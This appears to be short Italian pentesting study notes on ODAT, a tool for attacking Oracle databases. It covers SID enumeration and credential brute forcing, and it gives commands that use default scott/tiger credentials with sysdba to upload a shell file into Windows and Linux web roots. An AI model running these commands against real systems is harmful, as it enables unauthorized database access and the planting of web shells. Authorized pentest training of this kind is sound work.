# ODAT — Oracle Database Attacking Tool

**ODAT** è un tool per il pentesting di database Oracle. Permette enumerazione, brute force SID, upload file, esecuzione comandi e privilege escalation.

---

## A cosa serve?

- **Enumerazione:** Scopre SID, utenti, privilegi
- **Brute Force:** Testa credenziali
- **File Upload:** Carica file sul server via utlfile
- **Command Execution:** Esegue comandi sul server

---

## Come usarlo

### Enumerazione completa

```bash
./odat.py all -s 10.129.204.235
```

### Upload file sul server (Windows)

```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.txt ./shell.txt
```

### Upload file (Linux)

```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile /var/www/html shell.txt ./shell.txt
```

> Fonte: https://github.com/quentinhardy/odat
